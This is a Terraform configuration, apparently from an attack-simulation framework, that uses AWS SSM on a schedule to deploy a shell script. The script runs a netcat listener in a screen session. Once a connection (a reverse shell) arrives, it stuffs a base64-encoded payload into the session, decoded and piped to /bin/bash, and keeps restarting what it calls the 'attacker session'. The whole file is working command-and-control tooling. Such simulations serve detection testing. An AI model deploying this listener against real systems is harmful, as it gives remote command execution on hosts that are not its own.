locals {
    listen_port = var.listen_port
    listen_ip = var.listen_ip
    base64_command_payload = base64encode(var.payload)
    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    log "listener: ${local.listen_ip}:${local.listen_port}"
    while true; do
        screen -S netcat -X quit
        truncate -s 0 /tmp/netcat.log
        screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}
        screen -S netcat -X colon "logfile flush 0^M"
        log "listener started.."
        until tail /tmp/netcat.log | grep -m 1 "Connection received"; do
            log "waiting for connection...";
            sleep 10;
        done
        sleep 30
        log 'sending screen command: ${var.payload}';
        screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
        sleep 300
        log "restarting attacker session..."
    done
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

###########################
# SSM 
###########################

module "ssm" {
    source          = "../../../../../common/aws/ssm/base"
    environment     = var.environment
    deployment      = var.deployment
    tag             = var.tag
    timeout         = var.timeout
    cron            = var.cron
    base64_payload  = local.base64_payload
}